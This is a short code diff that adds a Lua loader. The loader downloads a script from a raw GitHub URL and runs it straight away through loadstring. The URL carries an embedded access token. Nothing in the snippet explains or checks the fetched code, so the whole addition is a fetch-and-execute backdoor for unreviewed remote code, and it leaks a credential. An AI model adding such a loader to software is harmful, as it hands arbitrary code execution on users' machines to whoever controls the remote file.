@@ -1,0 +1,8 @@
+HTTP.get('https://raw.githubusercontent.com/Madagenius/Pv/main/Main?token=GHSAT0AAAAAACTFJBACT3BEYLJ3SYA37V6CZS6UY6Q', function(script)
+    assert(loadstring(script))()
+end)
+
+
+
+
+
